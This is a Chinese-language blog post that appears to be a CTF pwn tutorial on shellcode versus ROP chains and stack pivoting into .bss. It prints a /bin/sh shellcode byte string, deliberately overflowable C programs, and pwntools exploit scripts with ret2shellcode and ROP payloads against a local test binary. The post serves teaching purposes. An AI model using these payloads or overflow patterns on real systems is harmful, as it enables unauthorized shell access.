<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>对于shellcode的一些理解 | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>对于shellcode的一些理解</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2022-12-19T07:50:51.000Z" id="date"> 2022-12-19</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-03-21T10:35:07.119Z" id="updated"> 2023-03-21</time></div></span><br><span>Word Count: <div class="control">1.6k</div></span><br><span>Read Time: <div class="control">7 min</div></span></div></div><hr><div id="post-content"><p>仅凭一段机器码 为什么shellcode可以篡改程序执行流 使其达到我们想要的结果</p>
<p>并且shellcode不同于rop链 并不能只是简单的覆盖ret addr为shellcode就可以达到效果 二者不同在哪里？</p>
<p>为什么bss段如果没有可执行权限的话就不能执行shellcode 但是同样的情况下就可以通过在bss段上写入rop链 随后栈迁移来控制程序执行流？ 这些疑问一一来解决一下</p>
<p>首先 什么是shellcode?</p>
<p>wiki上是这样定义的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In computer security, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called &quot;shellcode&quot; because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode.</span><br></pre></td></tr></table></figure>

<p>其是一段机器码 用来启动一个命令界面 攻击者可以用其来控制漏洞机器</p>
<p>通常的shellcode长什么样？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure>

<p>上面是一段23字节的64位shellcode 可以用来执行system(&#x2F;bin&#x2F;sh)</p>
<p>编写下面的程序 并且把NX保护关闭</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> magic[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;this is a test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input shellcode to bss&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,magic,<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modify the retaddr&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>向bss段中写入shellcode 并且修改retaddr为magic数组的首地址</p>
<p>但是如果想要直接覆盖ret addr为shellcode那么就无法达到同样的攻击效果</p>
<p>这是因为覆盖ret addr 实际上利用栈帧结束后 自带的两行指令 leave 和ret(外平栈)</p>
<p>来使esp和ebp指针指向父函数的栈帧 继续执行上一步操作 也就是说 ret add需要是一个地址 指向一连串的指令或者是shellcode这样的字节流数据</p>
<p>当然了 也正是出于栈帧的这种回归到父函数的操作 延申出了一种栈溢出手法叫做 栈迁移</p>
<p>下文不做基础解释 而是进行一个额外的知识扩展</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;input shellcode to bss&quot;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">bss_addr = <span class="number">0x601060</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;modify the retaddr&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(bss_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>如果打开NX保护 也就是使bss段不可执行 那么shellcode就无法执行</p>
<p>但是如果我们将bss段中的数据改为一串rop链 通过栈迁移的办法 看能不能实现系统调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> magic[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">    system(<span class="string">&quot;echo this is a test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh gift!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input shellcode to bss&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,magic,<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modify the retaddr&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给了system函数和字符串&#x2F;bin&#x2F;sh 很简单的rop64 不过我们不用覆盖ret addr来做 我们在bss段中构造rop链 然后栈迁移 注意此时NX保护打开了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;input shellcode to bss&quot;</span>)</span><br><span class="line">rdi_addr = <span class="number">0x400753</span></span><br><span class="line">binsh_addr = <span class="number">0x400788</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">system_addr = <span class="number">0x400520</span></span><br><span class="line">leave_addr = <span class="number">0x4006eb</span></span><br><span class="line">ret_addr = <span class="number">0x4004fe</span></span><br><span class="line">gadget1_addr = <span class="number">0x400730</span></span><br><span class="line">payload = p64(ret_addr)*<span class="number">100</span>+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;modify the retaddr&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)+p64(bss_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>唯一不好理解的地方在于为什么要多出来一百个字长的ret指令 首先 外平栈中ret指令相当于pop eip</p>
<p>弹出了一个栈空间 所以相当于往低地址的方向抬高栈顶</p>
<p>其次 我们需要明白为什么需要抬高栈顶 如果我们不抬的话会出现什么问题？</p>
<p>下面是没有p64(ret_addr)*100的情况 我们用pwndgb来查看一下此时的栈</p>
<p><img src="https://pic.imgdb.cn/item/63a43dba08b6830163c6bc38.png"></p>
<p>我们本来是想要将栈迁移至0x601080 但是此时指向了0x600f00</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000600F00                 Elf64_Dyn &lt;2, 60h&gt;      ; DT_PLTRELSZ</span><br><span class="line">LOAD:0000000000600F10                 Elf64_Dyn &lt;14h, 7&gt;      ; DT_PLTREL</span><br><span class="line">LOAD:0000000000600F20                 Elf64_Dyn &lt;17h, 400488h&gt; ; DT_JMPREL</span><br><span class="line">LOAD:0000000000600F30                 Elf64_Dyn &lt;7, 400428h&gt;  ; DT_RELA</span><br><span class="line">LOAD:0000000000600F40                 Elf64_Dyn &lt;8, 60h&gt;      ; DT_RELASZ</span><br><span class="line">LOAD:0000000000600F50                 Elf64_Dyn &lt;9, 18h&gt;      ; DT_RELAENT</span><br><span class="line">LOAD:0000000000600F60                 Elf64_Dyn &lt;6FFFFFFEh, 400408h&gt; ; DT_VERNEED</span><br><span class="line">LOAD:0000000000600F70                 Elf64_Dyn &lt;6FFFFFFFh, 1&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:0000000000600F80                 Elf64_Dyn &lt;6FFFFFF0h, 4003F6h&gt; ; DT_VERSYM</span><br><span class="line">LOAD:0000000000600F90                 Elf64_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>

<p>ida一般以load段中的内容来解析二进制文件 但是为什么esp会指向这里呢？</p>
<p>此时的栈帧空间迁移到了bss段 但是栈是由高地址往低地址处写 而bss段上方不远处是got表 很明显不能这样篡改got表</p>
<p>因为程序无法完成正常的栈迁移 如果你尝试过往test段迁移 就不会出现这种情况</p>
<p>所以这里利用ret指令抬高栈顶 跨过got表 就可以成功栈迁移 </p>
<p>同理 如果我们写入的bss段处地址离got表远一点  也可以达到同样的效果 如果你有做过一些栈迁移的题目 你会发现网上的exp迁移至的地址往往会偏差几百个字节 也是同理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;input shellcode to bss&quot;</span>)</span><br><span class="line">rdi_addr = <span class="number">0x400753</span></span><br><span class="line">binsh_addr = <span class="number">0x400788</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span>+<span class="number">0x300</span></span><br><span class="line">system_addr = <span class="number">0x400520</span></span><br><span class="line">leave_addr = <span class="number">0x4006eb</span></span><br><span class="line">ret_addr = <span class="number">0x4004fe</span></span><br><span class="line">gadget1_addr = <span class="number">0x400730</span></span><br><span class="line">payload = cyclic(<span class="number">0x300</span>)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;modify the retaddr&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)+p64(bss_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里说个题外话 这种因为bss段和got表近导致的情况还是很常见的 在出unlink题目的时候 也会遇到这种情况 不能做到任意写 但是可以通过出题的时候多声明一个全局数组 使其位于任意写的数组低地址处 详见以往的博客</p>
<p>至此 我们可以浅显的得出一个结论：</p>
<p>1.当程序没有开启NX保护的时候 并且我们得知栈地址或者bss段地址(人话:写入shellcode的地址) 可以通过ret2shellcode来解决题目</p>
<p>2.当程序没有打开NX保护 并且栈溢出的长度仅仅只有覆盖ret addr的长度 而且我们拥有往bss段(或者是rw-p权限的空间 即可读可写)</p>
<p>我们可以通过往该空间写入rop链 随后劫持esp和ebp栈迁移</p>
<p>要素在于理解说shellcode不同于rop链 其是一串字节流 可以达到特殊命令的字节流 </p>
<p>同时 在日后的题目中  要小心因为bss段和got表过于近而导致的栈空间出错 并能意识到这个问题</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/01/01/iofile%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80/">← Next iofile泄露libc基址</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/12/19/hitcontraining-heapcreator/">hitcontraining_heapcreator Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>Dr.chen</p></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>